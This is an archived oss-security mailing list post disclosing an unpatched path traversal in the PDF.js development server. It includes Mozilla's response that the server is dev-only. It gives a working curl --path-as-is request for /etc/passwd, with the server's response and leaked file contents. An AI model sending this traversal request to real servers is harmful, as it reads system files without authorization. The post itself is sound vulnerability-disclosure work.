X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1684" "Saturday" "24" "November" "2018" "13:16:49" "+0530" "Dhiraj Mishra" "mishra.dhiraj95@gmail.com" "<CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>" "52" "[oss-security] Path traversal in mozilla PDF.js [Unpatched]" "^Date:" nil nil "11" "2018112407:46:49" "[oss-security] Path traversal in mozilla PDF.js [Unpatched]" (number mark "        mishra.dhira Nov 24   52/1684  " thread-indent "\"[oss-security] Path traversal in mozilla PDF.js [Unpatched]\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32494 invoked by uid 550); 24 Nov 2018 11:28:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28059 invoked from network); 24 Nov 2018 07:47:13 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=maLAhna8+1P6ub3fRzHrA6hfI4yK5MQ2o4E6j0eoX+0=;
        b=Q03h+4a2pC9vMLCe/HJcJhUGNNZt99w3s/0XI40VPb821UiOOJMuIGOurBKupgvFzM
         i5NgNm3PrRHWNoBp1Om/sZ9fR/NRitJOu9/zzMTtEPAXk+VhyHIyQs+PiqKS8hPR5EvE
         RzI76HCPnSMW6lEkD47nkXFTOdPpnwh66Fq4yRliLSznUxXgvx3d2sLjujJdKjH68z4z
         Y7kGxbHCHasuv0gZeBGOWGrb09mWrbmtYyZk6wFR71cs6RPYoo8QRp4oUgLrWjMmoZPS
         RTMtZW+1IYV8CW3cpkLPg8zkFYv6MGJFcSj5v9O3GnqNTR0un4cezQtC1QqvEwPMWV1j
         v6OA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=maLAhna8+1P6ub3fRzHrA6hfI4yK5MQ2o4E6j0eoX+0=;
        b=YXfIm8vP6UCZ1o60h1gGazAgRz5AUyEwCcphY2zipFCBLwNLXNShwrzJ5qFLDJC+oV
         LU0Wpn961N7rp12iz89VtDPIqHpq7VKsdAP5lqjri/uOMTkKOdyVTCMpbLZ006xAvqUV
         ZZA0jtT70p0YvyHp+eqQsxrKgbLpqk7JEutNC5hmw/TOa/7DLNOMkPHq3M+WaLfviLzM
         s8ZKYMJebrCiilfZ8YbVtUCALv4HKHUa9ObKG0PDk/IHIGfMb8jYBDpzqDNHsQg1lZz8
         7lKU/EjgsKJOJsI6lpXupCUs8LVpfmt9eoyVcgVzV76nHbTGi8gr1rorU2StMOCBUK+9
         WKTw==
X-Gm-Message-State: AA+aEWb9ThQlgS3hJsN2bZqhOnaIfVgq/mLCxRw8H6kQrkzElZBBXs3u
	ty5cBQ66u/pRhfI+RW/TTYYlP0WiHZWFwFXHBn4d4GsM
X-Google-Smtp-Source: AFSGD/U/R6pQp3cqwkCmSpRlZ6ZTuOh3kR+swQGLxBs6aiPBP7XmJ3NukuSNu4cAGUej9m78a44sSMdDNMt7d8vSHkQ=
X-Received: by 2002:a63:bd51:: with SMTP id d17mr17330012pgp.443.1543045620906;
 Fri, 23 Nov 2018 23:47:00 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="0000000000001b3db6057b644e88"
Date: Sat, 24 Nov 2018 13:16:49 +0530
From: Dhiraj Mishra <mishra.dhiraj95@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Path traversal in mozilla PDF.js [Unpatched]
To: oss-security@lists.openwall.com

--0000000000001b3db6057b644e88
Content-Type: text/plain; charset="UTF-8"

## Summary
A path traversal issue was observed in Mozilla PDF.js which is a PDF reader
in JavaScript. This issue was observed while code review of PDF.js
(gulpfile.js)(
https://github.com/mozilla/pdf.js/blob/master/gulpfile.js#L1023), Mozilla
team says "The server with pdf.js is intended to be a development server
and should not be exposed to public networks. I suppose we could update the
docs to state that." and a upstream bug was filed against the same (
https://github.com/mozilla/pdf.js/issues/10249).

## Installation
PDF.js is built into version 19+ of firefox and a chrome extension is also
available on chrome web store. To install and get a local copy of PDF.js
here are the below steps :
$ git clone https://github.com/mozilla/pdf.js.git
$ cd pdf.js
$ npm install -g gulp-cli
$ npm install
$ gulp server

##Exploitation
I've used the attribute --path-as-is from cURL to verify this issue.
$ curl --path-as-is -v http://127.0.0.1:8888/../../../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8888 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8888
> User-Agent: curl/7.58.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Content-Type: application/octet-stream
< Content-Length: 2745
< Date: Thu, 15 Nov 2018 06:34:32 GMT
< Connection: keep-alive
<
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync


Thank you
Dhiraj (@mishradhiraj_)

--0000000000001b3db6057b644e88--
